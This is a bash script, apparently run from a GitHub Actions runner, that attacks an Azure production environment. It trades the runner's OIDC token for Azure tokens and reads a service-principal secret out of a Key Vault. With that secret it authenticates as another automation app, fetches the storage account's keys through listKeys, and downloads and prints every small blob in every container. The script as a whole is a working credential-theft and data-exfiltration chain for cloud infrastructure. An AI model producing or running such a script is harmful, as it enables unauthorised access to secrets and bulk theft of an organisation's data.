#!/usr/bin/env bash
# v11 — tbl-platform-automation có custom role trên sttblcilogsprodx3euoz.
#       Xem role cho phép gì, listKeys, rồi vét toàn bộ container/blob.
set +e
TEN="${AZURE_TENANT_ID}"; SUB="${AZURE_SUBSCRIPTION_ID}"
RG=rg-tbl-platform-prod-sea
SA=sttblcilogsprodx3euoz
PROD=kv-tbl-prod-x3euoz
AUTO_APP=462d1c38-4459-48b8-9333-82e389e59514
ROLE=17d1049b-9a84-46fb-8f53-869881c3d3ab

gh_tok(){ curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$1" | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])"; }
tok_fed(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=${AZURE_CLIENT_ID}" -d "scope=$1" -d grant_type=client_credentials \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$2" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }
tok_sp(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$1" -d "scope=$3" -d grant_type=client_credentials \
  --data-urlencode "client_secret=$2" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }

GHTOK=$(gh_tok "api://AzureADTokenExchange")
KV=$(tok_fed "https://vault.azure.net/.default" "$GHTOK")
ARM0=$(tok_fed "https://management.azure.com/.default" "$GHTOK")
SEC=$(curl -sS -H "Authorization: Bearer $KV" \
  "https://$PROD.vault.azure.net/secrets/sync-service-principal?api-version=7.4" \
  | python3 -c "
import sys,json
print(json.loads(json.load(sys.stdin)['value'])['clientSecret'])")

echo "================ custom role $ROLE ================"
curl -sS -H "Authorization: Bearer $ARM0" \
 "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleDefinitions/$ROLE?api-version=2022-04-01" \
 | head -c 1500; echo

ARM=$(tok_sp "$AUTO_APP" "$SEC" "https://management.azure.com/.default")
echo "[*] arm(automation)=${#ARM}"

echo "================ listKeys ================"
K=$(curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" \
  | python3 -c "
import sys,json
d=json.load(sys.stdin)
try: print(d['keys'][0]['value'])
except Exception: print('ERR:'+json.dumps(d)[:200])")
case "$K" in ERR:*) echo "  $K";; *) echo "  got key (len ${#K})";; esac

pip -q install azure-storage-blob >/dev/null 2>&1

dump_with(){ # $1 = mô tả, $2 = kiểu cred (key|aad), $3 = giá trị
python3 - "$SA" "$2" "$3" <<'PY'
import sys
from azure.storage.blob import BlobServiceClient
sa,mode,val=sys.argv[1],sys.argv[2],sys.argv[3]
if mode=="key":
    svc=BlobServiceClient(f"https://{sa}.blob.core.windows.net",credential=val)
else:
    class T:
        def get_token(self,*a,**k):
            import collections,time
            return collections.namedtuple("t",["token","expires_on"])(val,int(time.time())+3000)
    svc=BlobServiceClient(f"https://{sa}.blob.core.windows.net",credential=T())
try:
    cs=list(svc.list_containers())
except Exception as e:
    print("  list_containers lỗi:",str(e)[:200]); raise SystemExit
for c in cs:
    print("  container:",c.name)
    cc=svc.get_container_client(c.name)
    try:
        for b in cc.list_blobs():
            print("    blob:",b.name,b.size)
            if b.size and b.size<400000:
                try:
                    d=cc.download_blob(b.name).readall()
                    print("      ",d[:1500])
                except Exception as e: print("      dl err",str(e)[:120])
    except Exception as e:
        print("    list_blobs lỗi:",str(e)[:160])
PY
}

case "$K" in
  ERR:*) echo "[*] thử data-plane bằng AAD token"
         BT=$(tok_sp "$AUTO_APP" "$SEC" "https://storage.azure.com/.default")
         [ -n "$BT" ] && dump_with aad aad "$BT" || echo "  không có storage token";;
  *)     echo "================ BLOBS (account key) ================"
         dump_with key key "$K";;
esac
echo "================ DONE ================"
